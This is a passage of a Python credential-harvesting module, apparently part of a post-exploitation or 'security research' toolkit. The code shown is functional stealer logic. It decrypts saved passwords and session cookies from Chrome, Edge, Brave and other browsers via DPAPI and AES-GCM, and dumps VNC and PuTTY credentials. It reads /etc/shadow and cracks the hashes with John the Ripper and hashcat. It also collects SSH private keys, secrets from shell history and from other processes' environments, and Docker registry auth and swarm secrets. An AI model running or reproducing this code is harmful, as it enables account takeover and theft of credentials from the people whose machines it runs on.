                    os.environ.get("ProgramFiles", r"C:\Program Files"),
                    "RealVNC",
                    "VNC4",
                    "winvnc4.exe",
                ),
                os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "TightVNC", "tvnserver.exe"),
                os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "UltraVNC", "ultravnc.ini"),
            ]

            for config_path in vnc_config_paths:
                if os.path.exists(config_path):
                    try:
                        with open(config_path, "rb") as f:
                            content = f.read()

                        # Look for encrypted password patterns
                        password_patterns = [
                            b"Password=",
                            b"passwd=",
                            b"ViewOnlyPassword=",
                        ]

                        for pattern in password_patterns:
                            if pattern in content:
                                # Extract the encrypted password bytes
                                start = content.find(pattern) + len(pattern)
                                # VNC passwords are typically 8 bytes when encrypted
                                password_bytes = content[start : start + 8]

                                credentials["vnc_passwords"].append(
                                    {
                                        "config_file": config_path,
                                        "encrypted_password": password_bytes.hex(),
                                        "source": "config_file",
                                        "note": "Password is DES encrypted - requires decryption",
                                    }
                                )

                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                    ) as e:
                        self.logger.debug("Error reading VNC config %s: %s", config_path, e)

        except ImportError:
            self.logger.warning("winreg module not available for VNC credential extraction")
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("Error extracting VNC passwords: %s", e)

        return credentials

    def _windows_putty_sessions(self) -> dict[str, Any]:
        """Extract PuTTY saved session data including passwords."""
        credentials = {"putty_sessions": []}

        try:
            import winreg

            # PuTTY session registry location
            putty_path = r"SOFTWARE\SimonTatham\PuTTY\Sessions"

            for hive in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
                try:
                    with winreg.OpenKey(hive, putty_path) as sessions_key:
                        i = 0
                        while True:
                            try:
                                session_name = winreg.EnumKey(sessions_key, i)
                                session_path = f"{putty_path}\\{session_name}"

                                with winreg.OpenKey(hive, session_path) as session_key:
                                    session_data = {}
                                    j = 0
                                    while True:
                                        try:
                                            val_name, val_data, _ = winreg.EnumValue(session_key, j)
                                            session_data[val_name] = val_data
                                            j += 1
                                        except OSError as e:
                                            self.logger.error("OS error in credential_harvester: %s", e)
                                            break

                                    # Extract useful connection info
                                    session_info = {
                                        "session_name": session_name.replace("%20", " "),
                                        "hostname": session_data.get("HostName", ""),
                                        "username": session_data.get("UserName", ""),
                                        "port": session_data.get("PortNumber", 22),
                                        "protocol": session_data.get("Protocol", "ssh"),
                                        "proxy_host": session_data.get("ProxyHost", ""),
                                        "proxy_username": session_data.get("ProxyUsername", ""),
                                        "public_key_file": session_data.get("PublicKeyFile", ""),
                                        "source": f"registry_{hive}",
                                        "full_data": session_data,
                                    }

                                    if session_info["hostname"]:
                                        credentials["putty_sessions"].append(session_info)

                                i += 1
                            except OSError as e:
                                self.logger.error("OS error in credential_harvester: %s", e)
                                break

                except FileNotFoundError as e:
                    self.logger.error("File not found in credential_harvester: %s", e)
                    continue

            # Also check for PuTTY configuration files
            putty_config_paths = [
                os.path.expanduser("~/.putty/sessions"),
                os.path.expanduser("~/Documents/putty.reg"),
            ]

            for config_path in putty_config_paths:
                if os.path.exists(config_path):
                    try:
                        if os.path.isdir(config_path):
                            # Unix-style session directory
                            for session_file in os.listdir(config_path):
                                session_path = os.path.join(config_path, session_file)
                                with open(session_path) as f:
                                    content = f.read()

                                # Parse session data
                                session_data = {}
                                for line in content.split("\n"):
                                    if "=" in line:
                                        key, value = line.split("=", 1)
                                        session_data[key.strip()] = value.strip()

                                if session_data:
                                    credentials["putty_sessions"].append(
                                        {
                                            "session_name": session_file,
                                            "source": "unix_config",
                                            "data": session_data,
                                        }
                                    )
                        else:
                            # Registry export file
                            with open(config_path) as f:
                                content = f.read()

                            # Parse registry export format
                            sessions = re.findall(r"\[.*\\Sessions\\([^\]]+)\]", content)
                            for session in sessions:
                                credentials["putty_sessions"].append(
                                    {
                                        "session_name": session,
                                        "source": "registry_export",
                                        "file": config_path,
                                    }
                                )

                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                    ) as e:
                        self.logger.debug("Error reading PuTTY config %s: %s", config_path, e)

        except ImportError:
            self.logger.warning("winreg module not available for PuTTY session extraction")
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("Error extracting PuTTY sessions: %s", e)

        return credentials

    def _windows_firefox_passwords(self) -> dict[str, Any]:
        """Extract Firefox saved passwords from profile directories."""
        credentials = {"firefox_passwords": []}

        try:
            firefox_paths = [
                os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles"),
                os.path.expanduser("~/.mozilla/firefox"),
            ]

            for firefox_path in firefox_paths:
                if os.path.exists(firefox_path):
                    for profile in os.listdir(firefox_path):
                        profile_path = os.path.join(firefox_path, profile)
                        if os.path.isdir(profile_path):
                            logins_file = os.path.join(profile_path, "logins.json")
                            if os.path.exists(logins_file):
                                try:
                                    with open(logins_file, encoding="utf-8") as f:
                                        logins_data = json.load(f)

                                    for login in logins_data.get("logins", []):
                                        credentials["firefox_passwords"].append(
                                            {
                                                "hostname": login.get("hostname", ""),
                                                "username": login.get("encryptedUsername", ""),
                                                "password": login.get("encryptedPassword", ""),
                                                "profile": profile,
                                                "source": "firefox_profile",
                                                "note": "Passwords are encrypted - requires master password",
                                            }
                                        )

                                except (
                                    FileNotFoundError,
                                    PermissionError,
                                    OSError,
                                    AttributeError,
                                    ValueError,
                                    TypeError,
                                    RuntimeError,
                                ) as e:
                                    self.logger.debug("Error reading Firefox logins %s: %s", logins_file, e)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("Error extracting Firefox passwords: %s", e)

        return credentials

    def _windows_chrome_passwords(self) -> dict[str, Any]:
        """Extract and decrypt Chrome/Edge saved passwords using DPAPI."""
        credentials = {"chrome_passwords": []}

        try:
            import json
            import shutil
            import tempfile

            import win32crypt
            from Crypto.Cipher import AES

            # Browser profile paths
            browser_paths = {
                "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
                "Edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
                "Brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
                "Opera": os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"),
                "Vivaldi": os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data"),
            }

            for browser_name, user_data_path in browser_paths.items():
                if not os.path.exists(user_data_path):
                    continue

                # Get encryption key from Local State
                local_state_path = os.path.join(user_data_path, "Local State")
                encryption_key = None

                if os.path.exists(local_state_path):
                    try:
                        with open(local_state_path, "r", encoding="utf-8") as f:
                            local_state = json.load(f)

                        # Extract encrypted key
                        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

                        # Remove DPAPI prefix
                        encrypted_key = encrypted_key[5:]

                        # Decrypt with DPAPI
                        encryption_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

                    except Exception as e:
                        self.logger.debug("Could not get encryption key for %s: %s", browser_name, e)

                # Process each profile
                profiles = ["Default"]
                profile_dirs = [
                    d for d in os.listdir(user_data_path) if d.startswith("Profile ") and os.path.isdir(os.path.join(user_data_path, d))
                ]
                profiles.extend(profile_dirs)

                for profile in profiles:
                    login_data_path = os.path.join(user_data_path, profile, "Login Data")

                    if not os.path.exists(login_data_path):
                        continue

                    try:
                        # Copy database to avoid lock
                        with tempfile.NamedTemporaryFile(delete=False, suffix=".db") as temp_file:
                            shutil.copy2(login_data_path, temp_file.name)
                            temp_db_path = temp_file.name

                        # Query passwords
                        conn = sqlite3.connect(temp_db_path)
                        cursor = conn.cursor()

                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                        for row in cursor.fetchall():
                            url, username, encrypted_password = row

                            if not encrypted_password:
                                continue

                            decrypted_password = None

                            # Try to decrypt password
                            if encryption_key:
                                try:
                                    # Chrome v80+ encryption (AES-GCM)
                                    if encrypted_password[:3] == b"v10" or encrypted_password[:3] == b"v11":
                                        # Extract components
                                        nonce = encrypted_password[3:15]
                                        ciphertext = encrypted_password[15:]

                                        # Decrypt with AES-GCM
                                        cipher = AES.new(encryption_key, AES.MODE_GCM, nonce)
                                        decrypted_password = cipher.decrypt(ciphertext)[:-16].decode("utf-8")
                                    else:
                                        # Old DPAPI encryption
                                        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[
                                            1
                                        ].decode("utf-8")

                                except Exception as e:
                                    self.logger.debug("Failed to decrypt password: %s", e)
                                    # Try fallback DPAPI decryption
                                    try:
                                        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[
                                            1
                                        ].decode("utf-8")
                                    except Exception as e:
                                        self.logger.debug(f"Fallback DPAPI decryption failed for {url}: {e}")
                                        decrypted_password = "[ENCRYPTED]"

                            # Store credential
                            cred_entry = {
                                "browser": browser_name,
                                "profile": profile,
                                "url": url,
                                "username": username,
                                "password": decrypted_password if decrypted_password else None,
                                "encrypted": base64.b64encode(encrypted_password).decode() if not decrypted_password else None,
                                "source": "browser_profile",
                            }

                            credentials["chrome_passwords"].append(cred_entry)

                        cursor.close()
                        conn.close()

                        # Clean up temp file
                        try:
                            os.unlink(temp_db_path)
                        except Exception as e:
                            self.logger.debug(f"Failed to clean up temp database {temp_db_path}: {e}")

                    except Exception as e:
                        self.logger.debug("Error processing %s profile %s: %s", browser_name, profile, e)

                # Also check for cookies (session tokens)
                cookies_path = os.path.join(user_data_path, profile, "Cookies")
                if os.path.exists(cookies_path) and encryption_key:
                    try:
                        with tempfile.NamedTemporaryFile(delete=False, suffix=".db") as temp_file:
                            shutil.copy2(cookies_path, temp_file.name)
                            temp_cookies_path = temp_file.name

                        conn = sqlite3.connect(temp_cookies_path)
                        cursor = conn.cursor()

                        # Get session cookies for important sites
                        cursor.execute("""
                            SELECT host_key, name, encrypted_value, path, expires_utc
                            FROM cookies
                            WHERE (name LIKE '%session%' OR name LIKE '%token%' OR name LIKE '%auth%')
                            AND encrypted_value IS NOT NULL
                        """)

                        for row in cursor.fetchall():
                            host, name, encrypted_value, path, expires = row

                            if encrypted_value:
                                try:
                                    # Decrypt cookie value
                                    if encrypted_value[:3] == b"v10" or encrypted_value[:3] == b"v11":
                                        nonce = encrypted_value[3:15]
                                        ciphertext = encrypted_value[15:]
                                        cipher = AES.new(encryption_key, AES.MODE_GCM, nonce)
                                        decrypted_value = cipher.decrypt(ciphertext)[:-16].decode("utf-8")
                                    else:
                                        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode(
                                            "utf-8"
                                        )

                                    credentials["chrome_passwords"].append(
                                        {
                                            "browser": browser_name,
                                            "type": "cookie",
                                            "host": host,
                                            "name": name,
                                            "value": decrypted_value,
                                            "path": path,
                                            "expires": expires,
                                            "source": "browser_cookies",
                                        }
                                    )

                                except Exception as e:
                                    self.logger.debug(f"Failed to decrypt cookie {name} from {host}: {e}")

                        cursor.close()
                        conn.close()
                        os.unlink(temp_cookies_path)

                    except Exception as e:
                        self.logger.debug("Error extracting cookies from %s: %s", browser_name, e)

        except ImportError as e:
            self.logger.warning("Required modules not available for Chrome password extraction: %s", e)
        except Exception as e:
            self.logger.error("Error extracting Chrome passwords: %s", e)

        return credentials

    # Linux harvesting techniques

    def _linux_shadow_file(self) -> dict[str, Any]:
        """Extract and analyze password hashes from shadow file with cracking capabilities."""
        credentials = {"shadow_hashes": []}

        try:
            import crypt
            import tempfile

            shadow_path = "/etc/shadow"
            passwd_path = "/etc/passwd"

            # Get user info from passwd file
            user_info = {}
            if os.path.exists(passwd_path):
                try:
                    with open(passwd_path) as f:
                        for line in f:
                            if line.strip() and not line.startswith("#"):
                                parts = line.strip().split(":")
                                if len(parts) >= 7:
                                    user_info[parts[0]] = {
                                        "uid": parts[2],
                                        "gid": parts[3],
                                        "gecos": parts[4],
                                        "home": parts[5],
                                        "shell": parts[6],
                                    }
                except Exception as e:
                    self.logger.debug("Could not read passwd file: %s", e)

            if os.path.exists(shadow_path) and os.access(shadow_path, os.R_OK):
                with open(shadow_path) as f:
                    for line in f:
                        if line.strip() and not line.startswith("#"):
                            parts = line.strip().split(":")
                            if len(parts) >= 9:
                                username = parts[0]
                                password_hash = parts[1]

                                # Skip locked/disabled accounts
                                if password_hash and password_hash not in ["*", "!", "!!", "x"]:
                                    entry = {"username": username, "hash": password_hash, "type": "shadow_hash"}

                                    # Identify hash type
                                    if password_hash.startswith("$1$"):
                                        entry["hash_type"] = "MD5"
                                    elif password_hash.startswith("$2a$") or password_hash.startswith("$2b$"):
                                        entry["hash_type"] = "bcrypt"
                                    elif password_hash.startswith("$5$"):
                                        entry["hash_type"] = "SHA256"
                                    elif password_hash.startswith("$6$"):
                                        entry["hash_type"] = "SHA512"
                                    elif password_hash.startswith("$y$"):
                                        entry["hash_type"] = "yescrypt"
                                    else:
                                        entry["hash_type"] = "DES" if len(password_hash) == 13 else "unknown"

                                    # Add user info if available
                                    if username in user_info:
                                        entry.update(user_info[username])

                                    # Parse shadow entry details
                                    entry["last_change"] = parts[2] if len(parts) > 2 and parts[2] else None
                                    entry["min_days"] = parts[3] if len(parts) > 3 and parts[3] else None
                                    entry["max_days"] = parts[4] if len(parts) > 4 and parts[4] else None
                                    entry["warn_days"] = parts[5] if len(parts) > 5 and parts[5] else None
                                    entry["inactive_days"] = parts[6] if len(parts) > 6 and parts[6] else None
                                    entry["expire_date"] = parts[7] if len(parts) > 7 and parts[7] else None

                                    # Try common weak passwords with crypt
                                    weak_passwords = [
                                        "password",
                                        "123456",
                                        "password123",
                                        "admin",
                                        "root",
                                        "toor",
                                        "pass",
                                        "test",
                                        "guest",
                                        "qwerty",
                                        "letmein",
                                        username,
                                        username + "123",
                                        username + "1",
                                        username + "!",
                                    ]

                                    for test_pass in weak_passwords:
                                        try:
                                            # Use crypt to test password
                                            test_hash = crypt.crypt(test_pass, password_hash)
                                            if test_hash == password_hash:
                                                entry["cracked_password"] = test_pass
                                                entry["crack_method"] = "weak_password"
                                                break
                                        except Exception as e:
                                            self.logger.debug(f"Failed to test weak password {test_pass}: {e}")

                                    credentials["shadow_hashes"].append(entry)

                # If hashes found, try to crack with external tools
                if credentials["shadow_hashes"] and not any(h.get("cracked_password") for h in credentials["shadow_hashes"]):
                    # Check for John the Ripper
                    john_available = False
                    try:
                        import shutil

                        john_available = shutil.which("john") is not None
                    except Exception as e:
                        self.logger.debug(f"Failed to check for John the Ripper: {e}")
                        john_available = False

                    if john_available:
                        # Create temp file with hashes
                        with tempfile.NamedTemporaryFile(mode="w", suffix=".hash", delete=False) as hash_file:
                            for entry in credentials["shadow_hashes"]:
                                if "cracked_password" not in entry:
                                    hash_file.write(f"{entry['username']}:{entry['hash']}\n")
                            hash_file_path = hash_file.name

                        try:
                            # Run John with wordlist
                            wordlists = [
                                "/usr/share/wordlists/rockyou.txt",
                                "/usr/share/john/password.lst",
                                "/usr/share/wordlists/metasploit/unix_passwords.txt",
                            ]

                            for wordlist in wordlists:
                                if os.path.exists(wordlist):
                                    john_path = shutil.which("john")
                                    if john_path:
                                        result = subprocess.run(
                                            [john_path, f"--wordlist={wordlist}", "--format=crypt", hash_file_path],
                                            capture_output=True,
                                            timeout=30,
                                            check=False,
                                            shell=False,
                                        )

                                    # Check cracked passwords
                                    show_result = subprocess.run(
                                        [john_path, "--show", hash_file_path], capture_output=True, text=True, check=False, shell=False
                                    )

                                    if show_result.stdout:
                                        for line in show_result.stdout.split("\n"):
                                            if ":" in line:
                                                parts = line.split(":")
                                                if len(parts) >= 2:
                                                    cracked_user = parts[0]
                                                    cracked_pass = parts[1]

                                                    # Update entry with cracked password
                                                    for entry in credentials["shadow_hashes"]:
                                                        if entry["username"] == cracked_user:
                                                            entry["cracked_password"] = cracked_pass
                                                            entry["crack_method"] = "john_wordlist"
                                    break

                            # Clean up John pot file
                            if john_path:
                                subprocess.run(
                                    [john_path, "--pot=empty.pot", "--show", hash_file_path], capture_output=True, check=False, shell=False
                                )

                        except Exception as e:
                            self.logger.debug("John the Ripper cracking failed: %s", e)
                        finally:
                            try:
                                os.unlink(hash_file_path)
                            except Exception as e:
                                self.logger.debug(f"Failed to clean up hash file {hash_file_path}: {e}")

                    # Check for Hashcat
                    hashcat_available = False
                    try:
                        hashcat_available = shutil.which("hashcat") is not None
                    except Exception as e:
                        self.logger.debug(f"Failed to check for Hashcat: {e}")
                        hashcat_available = False

                    if hashcat_available and not all(h.get("cracked_password") for h in credentials["shadow_hashes"]):
                        # Map hash types to hashcat modes
                        hashcat_modes = {"MD5": "500", "bcrypt": "3200", "SHA256": "7400", "SHA512": "1800", "DES": "1500"}

                        for hash_type, mode in hashcat_modes.items():
                            hashes_of_type = [
                                h for h in credentials["shadow_hashes"] if h.get("hash_type") == hash_type and "cracked_password" not in h
                            ]

                            if hashes_of_type:
                                with tempfile.NamedTemporaryFile(mode="w", suffix=".hash", delete=False) as hash_file:
                                    for entry in hashes_of_type:
                                        hash_file.write(f"{entry['hash']}\n")
                                    hash_file_path = hash_file.name

                                try:
                                    # Run hashcat
                                    hashcat_path = shutil.which("hashcat")
                                    if hashcat_path:
                                        result = subprocess.run(
                                            [
                                                hashcat_path,
                                                "-m",
                                                mode,
                                                "-a",
                                                "0",
                                                hash_file_path,
                                                "/usr/share/wordlists/rockyou.txt",
                                                "--quiet",
                                                "--potfile-disable",
                                            ],
                                            capture_output=True,
                                            timeout=30,
                                            check=False,
                                        )

                                    # Parse output for cracked passwords
                                    if result.stdout:
                                        for line in result.stdout.decode("utf-8", errors="ignore").split("\n"):
                                            if ":" in line:
                                                parts = line.split(":")
                                                if len(parts) >= 2:
                                                    cracked_hash = parts[0]
                                                    cracked_pass = parts[1]

                                                    for entry in credentials["shadow_hashes"]:
                                                        if entry["hash"] == cracked_hash:
                                                            entry["cracked_password"] = cracked_pass
                                                            entry["crack_method"] = "hashcat"

                                except Exception as e:
                                    self.logger.debug("Hashcat cracking failed: %s", e)
                                finally:
                                    try:
                                        os.unlink(hash_file_path)
                                    except Exception as e:
                                        self.logger.debug(f"Failed to clean up hash file {hash_file_path}: {e}")

        except Exception as e:
            self.logger.debug("Shadow file extraction failed: %s", e)

        return credentials

    def _linux_ssh_keys(self) -> dict[str, Any]:
        """Extract SSH private keys."""
        credentials = {}

        try:
            ssh_paths = [
                "~/.ssh/",
                "/root/.ssh/",
                "/home/*/.ssh/",
            ]

            ssh_keys = []

            for ssh_path in ssh_paths:
                expanded_path = os.path.expanduser(ssh_path)

                if "*" in expanded_path:
                    import glob

                    matching_paths = glob.glob(expanded_path)
                    paths_to_check = matching_paths
                else:
                    paths_to_check = [expanded_path]

                for path in paths_to_check:
                    if os.path.exists(path) and os.path.isdir(path):
                        for filename in os.listdir(path):
                            if filename.startswith("id_") and not filename.endswith(".pub"):
                                key_path = os.path.join(path, filename)

                                try:
                                    with open(key_path) as f:
                                        key_content = f.read()

                                        if "PRIVATE KEY" in key_content:
                                            ssh_keys.append(
                                                {
                                                    "path": key_path,
                                                    "type": "ssh_private_key",
                                                    "algorithm": filename.split("_")[1] if "_" in filename else "unknown",
                                                }
                                            )

                                except (
                                    FileNotFoundError,
                                    PermissionError,
                                    OSError,
                                    AttributeError,
                                    ValueError,
                                    TypeError,
                                    RuntimeError,
                                ) as e:
                                    self.logger.error("Error in credential_harvester: %s", e)
                                    continue

            if ssh_keys:
                credentials["ssh_private_keys"] = ssh_keys

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.debug("SSH key extraction failed: %s", e)

        return credentials

    def _linux_browser_passwords(self) -> dict[str, Any]:
        """Extract passwords from Linux browsers."""
        credentials = {}

        try:
            for browser, db_path in self.browser_paths["linux"].items():
                try:
                    expanded_path = os.path.expanduser(db_path)

                    if "*" in expanded_path:
                        import glob

                        matching_paths = glob.glob(expanded_path)
                        for path in matching_paths:
                            browser_creds = self._extract_browser_credentials(path, browser)
                            if browser_creds:
                                credentials[f"{browser}_{os.path.basename(path)}"] = browser_creds
                    elif os.path.exists(expanded_path):
                        browser_creds = self._extract_browser_credentials(expanded_path, browser)
                        if browser_creds:
                            credentials[browser] = browser_creds

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                ) as e:
                    self.logger.debug("Browser %s extraction failed: %s", browser, e)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.debug("Linux browser password extraction failed: %s", e)

        return credentials

    def _linux_configuration_files(self) -> dict[str, Any]:
        """Search configuration files for credentials."""
        credentials = {}

        try:
            config_paths = [
                "/etc/",
                "/usr/local/etc/",
                "~/.config/",
                "/opt/*/conf/",
                "/var/lib/*/conf/",
            ]

            config_files = []

            for config_path in config_paths:
                expanded_path = os.path.expanduser(config_path)

                if "*" in expanded_path:
                    import glob

                    matching_paths = glob.glob(expanded_path)
                    paths_to_check = matching_paths
                else:
                    paths_to_check = [expanded_path]

                for path in paths_to_check:
                    if os.path.exists(path) and os.path.isdir(path):
                        try:
                            for root, dirs, files in os.walk(path):
                                # Skip hidden directories for performance
                                dirs[:] = [d for d in dirs if not d.startswith(".")]

                                for file in files:
                                    if any(ext in file.lower() for ext in [".conf", ".cfg", ".ini", ".env"]):
                                        file_path = os.path.join(root, file)
                                        file_creds = self._extract_credentials_from_file(file_path)

                                        if file_creds:
                                            config_files.append(
                                                {
                                                    "file": file_path,
                                                    "credentials": file_creds,
                                                }
                                            )

                        except (
                            FileNotFoundError,
                            PermissionError,
                            OSError,
                            AttributeError,
                            ValueError,
                            TypeError,
                            RuntimeError,
                        ) as e:
                            self.logger.error("Error in credential_harvester: %s", e)
                            continue

            if config_files:
                credentials["configuration_files"] = config_files

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.debug("Configuration file extraction failed: %s", e)

        return credentials

    def _linux_history_files(self) -> dict[str, Any]:
        """Extract credentials from shell history files."""
        credentials = {}

        try:
            history_files = [
                "~/.bash_history",
                "~/.zsh_history",
                "~/.fish_history",
                "/root/.bash_history",
                "/home/*/.bash_history",
            ]

            history_creds = []

            for history_file in history_files:
                expanded_path = os.path.expanduser(history_file)

                if "*" in expanded_path:
                    import glob

                    matching_paths = glob.glob(expanded_path)
                    paths_to_check = matching_paths
                else:
                    paths_to_check = [expanded_path]

                for path in paths_to_check:
                    if os.path.exists(path):
                        try:
                            with open(path) as f:
                                for line_num, line in enumerate(f, 1):
                                    # Look for commands with potential credentials
                                    if any(
                                        keyword in line.lower()
                                        for keyword in [
                                            "password",
                                            "passwd",
                                            "mysql",
                                            "psql",
                                            "ssh",
                                        ]
                                    ):
                                        creds = self._extract_credentials_from_text(line)
                                        if creds:
                                            history_creds.append(
                                                {
                                                    "file": path,
                                                    "line": line_num,
                                                    "command": line.strip(),
                                                    "credentials": creds,
                                                }
                                            )

                        except (
                            FileNotFoundError,
                            PermissionError,
                            OSError,
                            AttributeError,
                            ValueError,
                            TypeError,
                            RuntimeError,
                        ) as e:
                            self.logger.error("Error in credential_harvester: %s", e)
                            continue

            if history_creds:
                credentials["shell_history"] = history_creds

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.debug("History file extraction failed: %s", e)

        return credentials

    def _linux_environment_variables(self) -> dict[str, Any]:
        """Extract credentials from environment variables."""
        credentials = {}

        try:
            env_creds = []

            # Check current environment
            for key, value in os.environ.items():
                if any(keyword in key.lower() for keyword in ["password", "secret", "key", "token"]):
                    env_creds.append(
                        {
                            "variable": key,
                            "value": value,
                            "source": "current_environment",
                        }
                    )

            # Check /proc/*/environ for other processes
            try:
                for proc_dir in os.listdir("/proc"):
                    if proc_dir.isdigit():
                        environ_file = f"/proc/{proc_dir}/environ"

                        if os.path.exists(environ_file):
                            try:
                                with open(environ_file, "rb") as f:
                                    environ_data = f.read().decode("utf-8", errors="ignore")

                                    for env_var in environ_data.split("\x00"):
                                        if "=" in env_var:
                                            key, value = env_var.split("=", 1)

                                            if any(
                                                keyword in key.lower()
                                                for keyword in [
                                                    "password",
                                                    "secret",
                                                    "key",
                                                    "token",
                                                ]
                                            ):
                                                env_creds.append(
                                                    {
                                                        "variable": key,
                                                        "value": value,
                                                        "source": f"process_{proc_dir}",
                                                    }
                                                )

                            except (
                                FileNotFoundError,
                                PermissionError,
                                OSError,
                                AttributeError,
                                ValueError,
                                TypeError,
                                RuntimeError,
                            ) as e:
                                self.logger.error("Error in credential_harvester: %s", e)
                                continue

            except (
                FileNotFoundError,
                PermissionError,
                OSError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
            ) as e:
                self.logger.error("Error in credential_harvester: %s", e)

            if env_creds:
                credentials["environment_variables"] = env_creds

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.debug("Environment variable extraction failed: %s", e)

        return credentials

    # Additional Linux technique stubs

    def _linux_docker_credentials(self) -> dict[str, Any]:
        """Extract Docker credentials from configuration and runtime data."""
        credentials = {"docker_credentials": []}

        try:
            # Docker configuration paths
            docker_config_paths = [
                "~/.docker/config.json",
                "/root/.docker/config.json",
                "/var/lib/docker/config.json",
                "~/.dockercfg",
                "/etc/docker/daemon.json",
            ]

            for config_path in docker_config_paths:
                expanded_path = os.path.expanduser(config_path)
                if os.path.exists(expanded_path):
                    try:
                        with open(expanded_path) as f:
                            docker_config = json.load(f)

                        # Extract registry authentication
                        auths = docker_config.get("auths", {})
                        for registry, auth_data in auths.items():
                            auth_entry = {
                                "registry": registry,
                                "auth_data": auth_data,
                                "source": expanded_path,
                            }

                            # Decode basic auth if present
                            if "auth" in auth_data:
                                try:
                                    decoded_auth = base64.b64decode(auth_data["auth"]).decode("utf-8")
                                    if ":" in decoded_auth:
                                        username, password = decoded_auth.split(":", 1)
                                        auth_entry["username"] = username
                                        auth_entry["password"] = password
                                except (
                                    FileNotFoundError,
                                    PermissionError,
                                    OSError,
                                    AttributeError,
                                    ValueError,
                                    TypeError,
                                    RuntimeError,
                                ) as e:
                                    self.logger.error("Error in credential_harvester: %s", e)

                            credentials["docker_credentials"].append(auth_entry)

                        # Extract credential helpers
                        cred_helpers = docker_config.get("credHelpers", {})
                        if cred_helpers:
                            credentials["docker_credentials"].append(
                                {
                                    "type": "credential_helpers",
                                    "helpers": cred_helpers,
                                    "source": expanded_path,
                                }
                            )

                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                    ) as e:
                        self.logger.debug("Error reading Docker config %s: %s", expanded_path, e)

            # Docker environment variables from running containers
            try:
                # Get running containers
                result = subprocess.run(
                    ["docker", "ps", "--format", "{{.ID}}"],  # noqa: S607
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=10,
                )

                if result.returncode == 0:
                    container_ids = result.stdout.strip().split("\n")
                    for container_id in container_ids:
                        if container_id:
                            try:
                                # Get environment variables
                                env_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                    ["docker", "exec", container_id, "env"],  # noqa: S607
                                    check=False,
                                    capture_output=True,
                                    text=True,
                                    timeout=5,
                                )

                                if env_result.returncode == 0:
                                    env_vars = []
                                    for line in env_result.stdout.split("\n"):
                                        if any(
                                            keyword in line.upper()
                                            for keyword in [
                                                "PASSWORD",
                                                "SECRET",
                                                "TOKEN",
                                                "KEY",
                                                "API",
                                            ]
                                        ):
                                            env_vars.append(line.strip())

                                    if env_vars:
                                        credentials["docker_credentials"].append(
                                            {
                                                "type": "container_environment",
                                                "container_id": container_id,
                                                "environment_vars": env_vars,
                                                "source": "docker_exec",
                                            }
                                        )

                            except subprocess.TimeoutExpired as e:
                                self.logger.error("Subprocess timeout in credential_harvester: %s", e)
                                continue
                            except (
                                FileNotFoundError,
                                PermissionError,
                                OSError,
                                AttributeError,
                                ValueError,
                                TypeError,
                                RuntimeError,
                            ) as e:
                                self.logger.debug("Error extracting container env %s: %s", container_id, e)

            except (
                FileNotFoundError,
                PermissionError,
                OSError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
            ) as e:
                if isinstance(e, FileNotFoundError):
                    self.logger.error("File not found in credential_harvester: %s", e)
                    # Docker not installed or not in PATH
                else:
                    self.logger.debug("Error accessing Docker containers: %s", e)

            # Docker secrets (if accessible)
            docker_secrets_path = "/var/lib/docker/swarm/secrets"
            if os.path.exists(docker_secrets_path):
                try:
                    for secret_file in os.listdir(docker_secrets_path):
                        secret_path = os.path.join(docker_secrets_path, secret_file)
                        if os.path.isfile(secret_path):
                            try:
                                with open(secret_path, encoding="utf-8", errors="ignore") as f:
                                    secret_content = f.read()

                                credentials["docker_credentials"].append(
                                    {
                                        "type": "docker_secret",
                                        "secret_name": secret_file,
                                        "content": secret_content[:1000],  # Limit content size
                                        "source": secret_path,
                                    }
                                )
                            except (
                                FileNotFoundError,
                                PermissionError,
                                OSError,
                                AttributeError,
                                ValueError,
                                TypeError,
                                RuntimeError,
                            ) as e:
